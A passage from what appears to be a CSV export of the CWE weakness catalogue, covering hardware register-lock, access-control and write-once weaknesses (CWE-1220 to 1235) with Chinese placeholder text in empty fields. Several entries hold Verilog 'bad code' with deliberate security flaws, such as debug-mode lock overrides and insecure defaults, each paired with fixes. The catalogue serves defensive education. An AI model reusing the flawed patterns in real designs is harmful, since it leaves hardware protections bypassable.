hardware. In the code above, the GPIO pin should remain low for normal operation.  However, it can be asserted by accessing the reserved address space (0x0F).  This may be a concern if the GPIO state is being used as an indicator of health (e.g. if asserted the hardware may respond by shutting down or resetting the system, which may not be the correct action the system should perform).In the code below, the condition ""register_address = 0X0F"" is commented out, and a default is provided that will catch any values of register_address not explicitly accounted for and take no action with regards to gpio_out. This means that an attacker who is able to write 0X0F to register_address will not enable any undocumented ""features"" in the process.(good code)Example Language:Verilogreg gpio_out = 0;  //gpio should remain low for normal operationcase (register_address)//4'b1111 : //0x0Fdefault: gpio_out = gpio_out;","Phases:  Architecture and Design; ImplementationInclude a feature to disable reserved bits.Phase:  IntegrationAny writes to these reserve bits are blocked (e.g., ignored, access-protected, etc.), or an exception can be asserted."
CWE CATEGORY: Audit / Logging Errors,Weaknesses in this category are related to audit-based components of a software system. Frequently these deal with logging user activities in order to identify undesired access and modifications to the system. The weaknesses in this category could lead to a degradation of the quality of the audit capability if they are not addressed.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: Authentication Errors,"Weaknesses in this category are related to authentication components of a system. Frequently these deal with the ability to verify that an entity is indeed who it claims to be. If not addressed when designing or implementing a software system, these weaknesses could lead to a degradation of the quality of the authentication capability.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: Authorization Errors,"Weaknesses in this category are related to authorization components of a system. Frequently these deal with the ability to enforce that agents have the required permissions before performing certain operations, such as modifying data. If not addressed when designing or implementing a software system, these weaknesses could lead to a degradation of the quality of the authorization capability.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: Random Number Issues,Weaknesses in this category are related to a software system's random number generation.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: Data Integrity Issues,"Weaknesses in this category are related to a software system's data integrity components. Frequently these deal with the ability to ensure the integrity of data, such as messages, resource files, deployment files, and configuration files. The weaknesses in this category could lead to a degradation of data integrity quality if they are not addressed.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: Data Validation Issues,"Weaknesses in this category are related to a software system's components for input validation, output validation, or other kinds of validation. Validation is a frequently-used technique for ensuring that data conforms to expectations before it is further processed as input or output. There are many varieties of validation (seeCWE-20, which is just for input validation). Validation is distinct from other techniques that attempt to modify data before processing it, although developers may consider all attempts to product ""safe"" inputs or outputs as some kind of validation. Regardless, validation is a powerful tool that is often used to minimize malformed data from entering the system, or indirectly avoid code injection or other potentially-malicious patterns when generating output. The weaknesses in this category could lead to a degradation of the quality of data flow in a system if they are not addressed.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: Lockout Mechanism Errors,Weaknesses in this category are related to a software system's lockout mechanism. Frequently these deal with scenarios that take effect in case of multiple failed attempts to access a given resource. The weaknesses in this category could lead to a degradation of access to system assets if they are not addressed.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: User Session Errors,Weaknesses in this category are related to session management. Frequently these deal with the information or status about each user and their access rights for the duration of multiple requests. The weaknesses in this category could lead to a degradation of the quality of session management if they are not addressed.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: Memory Buffer Errors,Weaknesses in this category are related to the handling of memory buffers within a software system.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: File Handling Issues,"Weaknesses in this category are related to the handling of files within a software system. Files, directories, and folders are so central to information technology that many different weaknesses and variants have been discovered.",无常见后果信息,无示范例子,无可能的缓解方案
CWE-1220: Insufficient Granularity of Access Control,"The product implements access controls via a policy or other feature with the intention to disable or restrict accesses (reads and/or writes) to assets in a system from untrusted agents. However, implemented access controls lack required granularity, which renders the control policy too broad because it allows accesses from unauthorized agents to the security-sensitive assets.","Scope: ConfidentialityIntegrityAvailabilityAccess Control, Impact: Technical Impact:Modify Memory; Read Memory; Execute Unauthorized Code or Commands; Gain Privileges or Assume Identity; Bypass Protection Mechanism; Other, Likelihood: High","Example 1Consider a system with a register for storing AES key for encryption or decryption. The key is 128 bits, implemented as a set of four 32-bit registers. The key registers are assets and registers, AES_KEY_READ_POLICY and AES_KEY_WRITE_POLICY, and are defined to provide necessary access controls.The read-policy register defines which agents can read the AES-key registers, and write-policy register defines which agents can program or write to those registers. Each register is a 32-bit register, and it can support access control for a maximum of 32 agents. The number of the bit when set (i.e., ""1"") allows respective action from an agent whose identity matches the number of the bit and, if ""0"" (i.e., Clear), disallows the respective action to that corresponding agent.(bad code)Example Language:OtherRegisterField descriptionAES_ENC_DEC_KEY_0AES key [0:31] for encryption or decryptionDefault 0x00000000AES_ENC_DEC_KEY_1AES key [32:63] for encryption or decryptionDefault 0x00000000AES_ENC_DEC_KEY_2AES key [64:95] for encryption or decryptionDefault 0x00000000AES_ENC_DEC_KEY_4AES key [96:127] for encryption or decryptionDefault 0x00000000AES_KEY_READ_WRITE_POLICY[31:0] Default 0x00000006 - meaning agent with identities ""1"" and ""2"" can both read from and write to key registersIn the above example, there is only one policy register that controls access to both read and write accesses to the AES-key registers, and thus the design is not granular enough to separate read and writes access for different agents. Here, agent with identities ""1"" and ""2"" can both read and write.A good design should be granular enough to provide separate access controls to separate actions. Access control for reads should be separate from writes. Below is an example of such implementation where two policy registers are defined for each of these actions. The policy is defined such that: the AES-key registers can only be read or used by a crypto agent with identity ""1"" when bit #1 is set. The AES-key registers can only be programmed by a trusted firmware with identity ""2"" when bit #2 is set.(good code)AES_KEY_READ_POLICY[31:0] Default 0x00000002 - meaning only Crypto engine with identity ""1"" can read registers: AES_ENC_DEC_KEY_0, AES_ENC_DEC_KEY_1, AES_ENC_DEC_KEY_2, AES_ENC_DEC_KEY_3AES_KEY_WRITE_POLICY[31:0] Default 0x00000004 - meaning only trusted firmware with identity ""2"" can program registers: AES_ENC_DEC_KEY_0, AES_ENC_DEC_KEY_1, AES_ENC_DEC_KEY_2, AES_ENC_DEC_KEY_3Example 2Within the AXI node interface wrapper module in the RISC-V AXI module of the HACK@DAC'19 CVA6 SoC [REF-1346], an access control mechanism is employed to regulate the access of different privileged users to peripherals.The AXI ensures that only users with appropriate privileges can access specific peripherals. For instance, a ROM module is accessible exclusively with Machine privilege, and AXI enforces that users attempting to read data from the ROM must possess machine privilege; otherwise, access to the ROM is denied. The access control information and configurations are stored in a ROM.(bad code)Example Language:Verilog...for (i=0; i<NB_SUBORDINATE; i++)beginfor (j=0; j<NB_MANAGER; j++)beginassign connectivity_map_o[i][j] = access_ctrl_i[i][j][priv_lvl_i] || ((j==6) && access_ctrl_i[i][7][priv_lvl_i]);endend...However, in the example code above, while assigning distinct privileges to AXI manager and subordinates, both the Platform-Level Interrupt Controller Specification (PLIC) and the Core-local Interrupt Controller (CLINT) (which are peripheral numbers 6 and 7 respectively) utilize the same access control configuration. This common configuration diminishes the granularity of the AXI access control mechanism.In certain situations, it might be necessary to grant higher privileges for accessing the PLIC than those required for accessing the CLINT. Unfortunately, this differentiation is overlooked, allowing an attacker to access the PLIC with lower privileges than intended.As a consequence, unprivileged code can read and write to the PLIC even when it was not intended to do so. In the worst-case scenario, the attacker could manipulate interrupt priorities, potentially modifying the system's behavior or availability.To address the aforementioned vulnerability, developers must enhance the AXI access control granularity by implementing distinct access control entries for the Platform-Level Interrupt Controller (PLIC) and the Core-local Interrupt Controller (CLINT). By doing so, different privilege levels can be defined for accessing PLIC and CLINT, effectively thwarting the potential attacks previously highlighted. This approach ensures a more robust and secure system, safeguarding against unauthorized access and manipulation of interrupt priorities. [REF-1347](good code)Example Language:Verilog...for (i=0; i<NB_SUBORDINATE; i++)beginfor (j=0; j<NB_MANAGER; j++)beginassign connectivity_map_o[i][j] = access_ctrl_i[i][j][priv_lvl_i];endend...Example 3Consider the following SoC
	      design. The sram in HRoT has an address range that is readable and writable by unprivileged
	      software and it has an area that is only readable by unprivileged software. The tbus
	      interconnect enforces access control for subordinates on the bus but uses only one bit to control
	      both read and write access. Address 0xA0000000 - 0xA000FFFF is readable and writable
	      by the untrusted cores core{0-N} and address 0xA0010000 - 0xA001FFFF is only
	      readable by the untrusted cores core{0-N}.The security policy access control is not granular enough, as it uses one bit to enable both
	      read and write access. This gives write access to an area that should only be readable
	      by unprivileged agents.Access control logic should differentiate between read and write access and to have
	      sufficient address granularity.","Phases:  Architecture and Design; Implementation; TestingAccess-control-policy protections must be reviewed for design inconsistency and common weaknesses.Access-control-policy definition and programming flow must be tested in pre-silicon, post-silicon testing.Effectiveness: High"
CWE-1221: Incorrect Register Defaults or Module Parameters,Hardware description language code incorrectly defines register defaults or hardware Intellectual Property (IP) parameters to insecure values.,"Scope: ConfidentialityIntegrityAvailabilityAccess Control, Impact: Technical Impact:Varies by ContextDegradation of system functionality, or loss of access control enforcement can occur., Likelihood: ","Example 1Consider example design module system verilog code shown below. The register_example module is an example parameterized module that defines two parameters, REGISTER_WIDTH and REGISTER_DEFAULT. Register_example module defines a Secure_mode setting, which when set makes the register content read-only and not modifiable by software writes. register_top module instantiates two registers, Insecure_Device_ID_1 and Insecure_Device_ID_2. Generally, registers containing device identifier values are required to be read only to prevent any possibility of software modifying these values.(bad code)Example Language:Verilog// Parameterized Register module example// Secure_mode : REGISTER_DEFAULT[0] : When set to 1 register is read only and not writable//module register_example#(parameter REGISTER_WIDTH = 8, // Parameter defines width of register, default 8 bitsparameter [REGISTER_WIDTH-1:0] REGISTER_DEFAULT = 2**REGISTER_WIDTH -2 // Default value of register computed from Width. Sets all bits to 1s except bit 0 (Secure _mode))(input [REGISTER_WIDTH-1:0] Data_in,input Clk,input resetn,input write,output reg [REGISTER_WIDTH-1:0] Data_out);reg Secure_mode;always @(posedge Clk or negedge resetn)if (~resetn)beginData_out <= REGISTER_DEFAULT; // Register content set to Default at resetSecure_mode <= REGISTER_DEFAULT[0]; // Register Secure_mode set at resetendelse if (write & ~Secure_mode)beginData_out <= Data_in;endendmodulemodule register_top(input Clk,input resetn,input write,input [31:0] Data_in,output reg [31:0] Secure_reg,output reg [31:0] Insecure_reg);register_example #(.REGISTER_WIDTH (32),.REGISTER_DEFAULT (1224) // Incorrect Default value used bit 0 is 0.) Insecure_Device_ID_1 (.Data_in (Data_in),.Data_out (Secure_reg),.Clk (Clk),.resetn (resetn),.write (write));register_example #(.REGISTER_WIDTH (32) // Default not defined 2^32-2 value will be used as default.) Insecure_Device_ID_2 (.Data_in (Data_in),.Data_out (Insecure_reg),.Clk (Clk),.resetn (resetn),.write (write));endmoduleThese example instantiations show how, in a hardware design, it would be possible to instantiate the register module with insecure defaults and parameters.In the example design, both registers will be software writable since Secure_mode is defined as zero.(good code)Example Language:Verilogregister_example #(.REGISTER_WIDTH (32),.REGISTER_DEFAULT (1225) // Correct default value set, to enable Secure_mode) Secure_Device_ID_example (.Data_in (Data_in),.Data_out (Secure_reg),.Clk (Clk),.resetn (resetn),.write (write));Example 2The example code is taken from the fuse memory inside the buggy OpenPiton SoC of HACK@DAC'21 [REF-1356]. Fuse memory can be used to store key hashes, password hashes, and configuration information. For example, the password hashes of JTAG and HMAC are stored in the fuse memory in the OpenPiton design.During the firmware setup phase, data in the Fuse memory are transferred into the registers of the corresponding SoC peripherals for initialization. However, if the offset to access the password hash is set incorrectly, programs cannot access the correct password hash from the fuse memory, breaking the functionalities of the peripherals and even exposing sensitive information through other peripherals.(bad code)Example Language:Verilogparameter  MEM_SIZE = 100;localparam JTAG_OFFSET = 81;const logic [MEM_SIZE-1:0][31:0] mem = {// JTAG expected hamc hash32'h49ac13af, 32'h1276f1b8, 32'h6703193a, 32'h65eb531b,32'h3025ccca, 32'h3e8861f4, 32'h329edfe5, 32'h98f763b4,...assign jtag_hash_o = {mem[JTAG_OFFSET-1],mem[JTAG_OFFSET-2],mem[JTAG_OFFSET-3],mem[JTAG_OFFSET-4],mem[JTAG_OFFSET-5],mem[JTAG_OFFSET-6],mem[JTAG_OFFSET-7],mem[JTAG_OFFSET-8]};...The following vulnerable code accesses the JTAG password hash from the fuse memory. However, the JTAG_OFFSET is incorrect, and the fuse memory outputs the wrong values to jtag_hash_o. Moreover, setting incorrect offset gives the ability to attackers to access JTAG by knowing other low-privileged peripherals' passwords.To mitigate this, change JTAG_OFFSET to the correct address of the JTAG key [REF-1357].(good code)Example Language:Verilogparameter  MEM_SIZE = 100;localparam JTAG_OFFSET = 100;","Phase:  Architecture and DesignDuring hardware design, all the system parameters and register defaults must be reviewed to identify security sensitive settings.Phase:  ImplementationThe default values of these security sensitive settings need to be defined as part of the design review phase.Phase:  TestingTesting phase should use automated tools to test that values are configured per design specifications."
CWE-1222: Insufficient Granularity of Address Regions Protected by Register Locks,The product defines a large address region protected from modification by the same register lock control bit. This results in a conflict between the functional requirement that some addresses need to be writable by software during operation and the security requirement that the system configuration lock bit must be set during the boot process.,"Scope: Access Control, Impact: Technical Impact:OtherSystem security configuration cannot be defined in a way that does not conflict with functional requirements of device., Likelihood: ","Example 1For example, consider a hardware unit with a 32 kilobyte configuration address space where the first 8 kilobyte address contains security sensitive controls that must only be writable by device bootloader. One way to protect the security configuration could be to define a 32 bit system configuration locking register (SYS_LOCK) where each bit lock locks the corresponding 1 kilobyte region.(bad code)Example Language:OtherAddressRegister0x0000SYS_LOCK: 32 bit system configuration lock register, each bit is write-1-once0x0004SECURITY_FEATURE_ENABLE: 32 bit register controlling enabling of security features...0x0310SW_MODE: 32 bit Software Mode indication registerAddress regionLock bit0x0000 - 0x03FFSYS_LOCK[0]0x0400 - 0x07FFSYS_LOCK[1]...0x7C00 - 0x7FFFSYS_LOCK[31]If a register exists within the first kilobyte address range (e.g. SW_MODE, address 0x310) and needs to be software writable at runtime, then this register cannot be written in a securely configured system since SYS_LOCK register lock bit 0 must be set to protect other security settings (e.g. SECURITY_FEATURE_ENABLE, address 0x0004). The only fix would be to change the hardware logic or not set the security lock bit.","Phase:  Architecture and DesignThe defining of protected locked registers should be reviewed or tested early in the design phase with software teams to ensure software flows are not blocked by the security locks.As an alternative to using register lock control bits and fixed access control regions, the hardware design could use programmable security access control configuration so that device trusted firmware can configure and change the protected regions based on software usage and security models."
CWE-1223: Race Condition for Write-Once Attributes,"A write-once register in hardware design is programmable by an untrusted software component earlier than the trusted software component, resulting in a race condition issue.","Scope: Access Control, Impact: Technical Impact:Bypass Protection MechanismSystem configuration cannot be programmed in a secure way., Likelihood: ","Example 1consider the example design module system verilog code shown below. register_write_once_example module is an example of register that has a write-once field defined. Bit 0 field captures the write_once_status value.(bad code)Example Language:Verilogmodule register_write_once_example(input [15:0] Data_in,input Clk,input ip_resetn,input global_resetn,input write,output reg [15:0] Data_out);reg Write_once_status;always @(posedge Clk or negedge ip_resetn)if (~ip_resetn)beginData_out <= 16'h0000;Write_once_status <= 1'b0;endelse if (write & ~Write_once_status)beginData_out <= Data_in & 16'hFFFE; // Input data written to register after masking bit 0Write_once_status <= 1'b1; // Write once status set after first write.endelse if (~write)beginData_out[15:1] <= Data_out[15:1];Data_out[0] <= Write_once_status;endendmoduleThe first system component that sends a write cycle to this register can program the value. This could result in a race condition security issue in the SoC design, if an untrusted agent is running in the system in parallel with the trusted component that is expected to program the register.(good code)Trusted firmware or software trying to set the write-once field:Must confirm the Write_once_status (bit 0) value is zero, before programming register. If another agent has programmed the register before, then Write_once_status value will be one.After writing to the register, the trusted software can issue a read to confirm that the valid setting has been programmed.",Phase:  Architecture and DesignDuring hardware design all register write-once or sticky fields must be evaluated for proper configuration.Phase:  TestingThe testing phase should use automated tools to test that values are not reprogrammable and that write-once fields lock on writing zeros.
CWE-1224: Improper Restriction of Write-Once Bit Fields,"The hardware design control register ""sticky bits"" or write-once bit fields are improperly implemented, such that they can be reprogrammed by software.","Scope: ConfidentialityIntegrityAvailabilityAccess Control, Impact: Technical Impact:Varies by ContextSystem configuration cannot be programmed in a secure way., Likelihood: ","Example 1Consider the example design module system verilog code shown below. register_write_once_example module is an example of register that has a write-once field defined. Bit 0 field captures the write_once_status value. This implementation can be for a register that is defined by specification to be a write-once register, since the write_once_status field gets written by input data bit 0 on first write.(bad code)Example Language:Verilogmodule register_write_once_example(input [15:0] Data_in,input Clk,input ip_resetn,input global_resetn,input write,output reg [15:0] Data_out);reg Write_once_status;always @(posedge Clk or negedge ip_resetn)if (~ip_resetn)beginData_out <= 16'h0000;Write_once_status <= 1'b0;endelse if (write & ~Write_once_status)beginData_out <= Data_in & 16'hFFFE;Write_once_status <= Data_in[0]; // Input bit 0 sets Write_once_statusendelse if (~write)beginData_out[15:1] <= Data_out[15:1];Data_out[0] <= Write_once_status;endendmoduleThe above example only locks further writes if write_once_status bit is written to one. So it acts as write_1-Once instead of the write-once attribute.(good code)Example Language:Verilogmodule register_write_once_example(input [15:0] Data_in,input Clk,input ip_resetn,input global_resetn,input write,output reg [15:0] Data_out);reg Write_once_status;always @(posedge Clk or negedge ip_resetn)if (~ip_resetn)beginData_out <= 16'h0000;Write_once_status <= 1'b0;endelse if (write & ~Write_once_status)beginData_out <= Data_in & 16'hFFFE;Write_once_status <= 1'b1; // Write once status set on first write, independent of inputendelse if (~write)beginData_out[15:1] <= Data_out[15:1];Data_out[0] <= Write_once_status;endendmodule",Phase:  Architecture and DesignDuring hardware design all register write-once or sticky fields must be evaluated for proper configuration.Phase:  TestingThe testing phase should use automated tools to test that values are not reprogrammable and that write-once fields lock on writing zeros.
CWE CATEGORY: Documentation Issues,"Weaknesses in this category are related to the documentation provided to support, create, or analyze a product.",无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: Complexity Issues,Weaknesses in this category are associated with things being overly complex.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: Encapsulation Issues,Weaknesses in this category are related to issues surrounding the bundling of data with the methods intended to operate on that data.,无常见后果信息,无示范例子,无可能的缓解方案
CWE CATEGORY: API / Function Errors,Weaknesses in this category are related to the use of built-in functions or external APIs.,无常见后果信息,无示范例子,无可能的缓解方案
CWE-1229: Creation of Emergent Resource,"The product manages resources or behaves in a way that indirectly creates a new, distinct resource that can be used by attackers in violation of the intended policy.",无常见后果信息,无示范例子,无可能的缓解方案
CWE-1230: Exposure of Sensitive Information Through Metadata,"The product prevents direct access to a resource containing sensitive information, but it does not sufficiently limit access to metadata that is derived from the original, sensitive information.",无常见后果信息,无示范例子,无可能的缓解方案
CWE-1231: Improper Prevention of Lock Bit Modification,"The product uses a trusted lock bit for restricting access to registers, address regions, or other resources, but the product does not prevent the value of the lock bit from being modified after it has been set.","Scope: Access Control, Impact: Technical Impact:Modify MemoryRegisters protected by lock bit can be modified even when lock is set., Likelihood: High","Example 1Consider the example design below for a digital thermal sensor that detects overheating of the silicon and triggers system shutdown. The system critical temperature limit (CRITICAL_TEMP_LIMIT) and thermal sensor calibration (TEMP_SENSOR_CALIB) data have to be programmed by firmware, and then the register needs to be locked (TEMP_SENSOR_LOCK).(bad code)Example Language:OtherRegisterField descriptionCRITICAL_TEMP_LIMIT[31:8] Reserved field; Read only; Default 0[7:0] Critical temp 0-255 Centigrade; Read-write-lock; Default 125TEMP_SENSOR_CALIB[31:0] Thermal sensor calibration data. Slope value used to map sensor reading to degrees Centigrade.TEMP_SENSOR_LOCK[31:1] Reserved field; Read only; Default 0[0] Lock bit, locks CRITICAL_TEMP_LIMIT and TEMP_SENSOR_CALIB registers; Write-1-once; Default 0TEMP_HW_SHUTDOWN[31:2] Reserved field; Read only; Default 0[1] Enable hardware shutdown on critical temperature detection; Read-write; Default 0CURRENT_TEMP[31:8] Reserved field; Read only; Default 0[7:0] Current Temp 0-255 Centigrade; Read-only; Default 0In this example, note that if the system heats to critical temperature, the response of the system is controlled by the TEMP_HW_SHUTDOWN bit [1], which is not lockable. Thus, the intended security property of the critical temperature sensor cannot be fully protected, since software can misconfigure the TEMP_HW_SHUTDOWN register even after the lock bit is set to disable the shutdown response.(good code)To fix this weakness, one could change the TEMP_HW_SHUTDOWN field to be locked by TEMP_SENSOR_LOCK.TEMP_HW_SHUTDOWN[31:2] Reserved field; Read only; Default 0[1] Enable hardware shutdown on critical temperature detection; Read-write-Lock; Default 0[0] Locked by TEMP_SENSOR_LOCKExample 2The following example code is a snippet from the register locks inside the buggy OpenPiton SoC of HACK@DAC'21 [REF-1350]. Register locks help prevent SoC peripherals' registers from malicious use of resources. The registers that can potentially leak secret data are locked by register locks.In the vulnerable code, the reglk_mem is used for locking information. If one of its bits toggle to 1, the corresponding peripheral's registers will be locked. In the context of the HACK@DAC System-on-Chip (SoC), it is pertinent to note the existence of two distinct categories of reset signals.First, there is a global reset signal denoted as ""rst_ni,"" which possesses the capability to simultaneously reset all peripherals to their respective initial states.Second, we have peripheral-specific reset signals, such as ""rst_9,"" which exclusively reset individual peripherals back to their initial states. The administration of these reset signals is the responsibility of the reset controller module.(bad code)Example Language:Verilogalways @(posedge clk_i)beginif(~(rst_ni && ~jtag_unlock && ~rst_9))beginfor (j=0; j < 6; j=j+1) beginreglk_mem[j] <= 'h0;endend...In the buggy SoC architecture during HACK@DAC'21, a critical issue arises within the reset controller module. Specifically, the reset controller can inadvertently transmit a peripheral reset signal to the register lock within the user privilege domain.This unintentional action can result in the reset of the register locks, potentially exposing private data from all other peripherals, rendering them accessible and readable.To mitigate the issue, remove the extra reset signal rst_9 from the register lock if condition. [REF-1351](good code)Example Language:Verilogalways @(posedge clk_i)beginif(~(rst_ni && ~jtag_unlock))beginfor (j=0; j < 6; j=j+1) beginreglk_mem[j] <= 'h0;endend...",Phases:  Architecture and Design; Implementation; TestingSecurity lock bit protections must be reviewed for design inconsistency and common weaknesses.Security lock programming flow and lock properties must be tested in pre-silicon and post-silicon testing.Effectiveness: High
CWE-1232: Improper Lock Behavior After Power State Transition,"Register lock bit protection disables changes to system configuration once the bit is set. Some of the protected registers or lock bits become programmable after power state transitions (e.g., Entry and wake from low power sleep modes) causing the system configuration to be changeable.","Scope: Access Control, Impact: Technical Impact:Modify Memory, Likelihood: High","Example 1Consider the memory configuration settings of a system that uses DDR3 DRAM memory. Protecting the DRAM memory configuration from modification by software is required to ensure that system memory access control protections cannot be bypassed. This can be done by using lock bit protection that locks all of the memory configuration registers. The memory configuration lock can be set by the BIOS during the boot process.If such a system also supports a rapid power on mode like hibernate, the DRAM data must be saved to a disk before power is removed and restored back to the DRAM once the system powers back up and before the OS resumes operation after returning from hibernate.To support the hibernate transition back to the operating state, the DRAM memory configuration must be reprogrammed even though it was locked previously. As the hibernate resume does a partial reboot, the memory configuration could be altered before the memory lock is set. Functionally the hibernate resume flow requires a bypass of the lock-based protection. The memory configuration must be securely stored and restored by trusted system firmware. Lock settings and system configuration must be restored to the same state it was in before the device entered into the hibernate mode.",Phases:  Architecture and Design; Implementation; TestingSecurity Lock bit protections should be reviewed for behavior across supported power state transitions.Security lock programming flow and lock properties should be tested in pre-silicon and post-silicon testing including testing across power transitions.Effectiveness: High
CWE-1233: Security-Sensitive Hardware Controls with Missing Lock Bit Protection,"The product uses a register lock bit protection mechanism, but it does not ensure that the lock bit prevents modification of system registers or controls that perform changes to important hardware system configuration.","Scope: Access Control, Impact: Technical Impact:Modify MemorySystem Configuration protected by the lock bit can be modified even when the lock is set., Likelihood: ","Example 1Consider the example design below for a digital thermal sensor that detects overheating of the silicon and triggers system shutdown. The system critical temperature limit (CRITICAL_TEMP_LIMIT) and thermal sensor calibration (TEMP_SENSOR_CALIB) data have to be programmed by the firmware.(bad code)Example Language:OtherRegisterField descriptionCRITICAL_TEMP_LIMIT[31:8] Reserved field; Read only; Default 0[7:0] Critical temp 0-255 Centigrade; Read-write-lock; Default 125TEMP_SENSOR_CALIB[31:0] Thermal sensor calibration data. A slope value used to map sensor reading to a degree Centigrade. Read-write; Default 25TEMP_SENSOR_LOCK[31:1] Reserved field; Read only; Default 0[0] Lock bit, locks CRITICAL_TEMP_LIMIT register; Write-1-once; Default 0TEMP_HW_SHUTDOWN[31:2] Reserved field; Read only; Default 0[1] Enable hardware shutdown on a critical temperature detection; Read-write; Default 0CURRENT_TEMP[31:8] Reserved field; Read only; Default 0[7:0]   Current Temp 0-255 Centigrade; Read-only; Default 0In this example note that only the CRITICAL_TEMP_LIMIT register is protected by the TEMP_SENSOR_LOCK bit, while the security design intent is to protect any modification of the critical temperature detection and response.The response of the system, if the system heats to a critical temperature, is controlled by TEMP_HW_SHUTDOWN bit [1], which is not lockable. Also, the TEMP_SENSOR_CALIB register is not protected by the lock bit.By modifying the temperature sensor calibration, the conversion of the sensor data to a degree centigrade can be changed, such that the current temperature will never be detected to exceed critical temperature value programmed by the protected lock.Similarly, by modifying the TEMP_HW_SHUTDOWN.Enable bit, the system response detection of the current temperature exceeding critical temperature can be disabled.(good code)Change TEMP_HW_SHUTDOWN and TEMP_SENSOR_CALIB controls to be locked by TEMP_SENSOR_LOCK.TEMP_SENSOR_CALIB[31:0] Thermal sensor calibration data. A slope value used to map sensor reading to a degree Centigrade. Read-write-Lock; Default 25; Locked by TEMP_SENSOR_LOCK bit[0]TEMP_HW_SHUTDOWN[31:2] Reserved field; Read only; Default 0[1] Enable hardware shutdown on critical temperature detection; Read-write-Lock; Default 0; Locked by TEMP_SENSOR_LOCK bit[0]",Phases:  Architecture and Design; Implementation; TestingSecurity lock bit protections must be reviewed for design inconsistency and common weaknesses.Security lock programming flow and lock properties must be tested in pre-silicon and post-silicon testing.
CWE-1234: Hardware Internal or Debug Modes Allow Override of Locks,System configuration protection may be bypassed during debug mode.,"Scope: Access Control, Impact: Technical Impact:Bypass Protection MechanismBypass of lock bit allows access and modification of system configuration even when the lock bit is set., Likelihood: High","Example 1For example, consider the example Locked_override_register example. This register module supports a lock mode that blocks any writes after lock is set to 1.However, it also allows override of the lock protection when scan_mode or debug_unlocked modes are active.(bad code)Example Language:Verilogmodule Locked_register_example(input [15:0] Data_in,input Clk,input resetn,input write,input Lock,input scan_mode,input debug_unlocked,output reg [15:0] Data_out);reg lock_status;always @(posedge Clk or negedge resetn)if (~resetn) // Register is reset resetnbeginlock_status <= 1'b0;endelse if (Lock)beginlock_status <= 1'b1;endelse if (~Lock)beginlock_status <= lock_statusendalways @(posedge Clk or negedge resetn)if (~resetn) // Register is reset resetnbeginData_out <= 16'h0000;endelse if (write & (~lock_status | scan_mode | debug_unlocked) ) // Register protected by Lock bit input, overrides supported for scan_mode & debug_unlockedbeginData_out <= Data_in;endelse if (~write)beginData_out <= Data_out;endendmoduleIf either the scan_mode or the debug_unlocked modes can be triggered by software, then the lock protection may be bypassed.(good code)Either remove the debug and scan mode overrides or protect enabling of these modes so that only trusted and authorized users may enable these modes.Example 2The following example code [REF-1375] is taken from the register lock security peripheral of the HACK@DAC'21 buggy OpenPiton SoC. It demonstrates how to lock read or write access to security-critical hardware registers (e.g., crypto keys, system integrity code, etc.). The configuration to lock all the sensitive registers in the SoC is managed through the reglk_mem registers. These reglk_mem registers are reset when the hardware powers up and configured during boot up. Malicious users, even with kernel-level software privilege, do not get access to the sensitive contents that are locked down. Hence, the security of the entire system can potentially be compromised if the register lock configurations are corrupted or if the register locks are disabled.(bad code)Example Language:Verilog...always @(posedge clk_i)beginif(~(rst_ni && ~jtag_unlock && ~rst_9))beginfor (j=0; j < 6; j=j+1) beginreglk_mem[j] <= 'h0;endend...The example code [REF-1375] illustrates an instance of a vulnerable implementation of register locks in the SoC. In this flawed implementation [REF-1375], the reglk_mem registers are also being reset when the system enters debug mode (indicated by the jtag_unlock signal). Consequently, users can simply put the processor in debug mode to access sensitive contents that are supposed to be protected by the register lock feature.This can be mitigated by excluding debug mode signals from the reset logic of security-critical register locks as demonstrated in the following code snippet [REF-1376].(good code)Example Language:Verilog...always @(posedge clk_i)beginif(~(rst_ni && ~rst_9))beginfor (j=0; j < 6; j=j+1) beginreglk_mem[j] <= 'h0;endend...",Phases:  Architecture and Design; Implementation; TestingSecurity Lock bit protections should be reviewed for any bypass/override modes supported.Any supported override modes either should be removed or protected using authenticated debug modes.Security lock programming flow and lock properties should be tested in pre-silicon and post-silicon testing.Effectiveness: High
CWE-1235: Incorrect Use of Autoboxing and Unboxing for Performance Critical Operations,"The code uses boxed primitives, which may introduce inefficiencies into performance-critical operations.","Scope: Availability, Impact: Technical Impact:DoS: Resource Consumption (CPU); DoS: Resource Consumption (Memory); DoS: Resource Consumption (Other); Reduce PerformanceIncorrect autoboxing/unboxing would result in reduced performance, which sometimes can lead to resource consumption issues., Likelihood: Low","Example 1Java has a boxed primitive for each primitive type. A long can be represented with the boxed primitive Long. Issues arise where boxed primitives are used when not strictly necessary.(bad code)Example Language:JavaLong count = 0L;for (long i = 0; i < Integer.MAX_VALUE; i++) {count += i;}In the above loop, we see that the count variable is declared as a boxed primitive. This causes autoboxing on the line that increments. This causes execution to be magnitudes less performant (time and possibly space) than if the ""long"" primitive was used to declare the count variable, which can impact availability of a resource.Example 2This code uses primitive long which fixes the issue.(good code)Example Language:Javalong count = 0L;for (long i = 0; i < Integer.MAX_VALUE; i++) {count += i;}",Phase:  ImplementationUse of boxed primitives should be limited to certain situations such as when calling methods with typed parameters. Examine the use of boxed primitives prior to use. Use SparseArrays or ArrayMap instead of HashMap to avoid performance overhead.
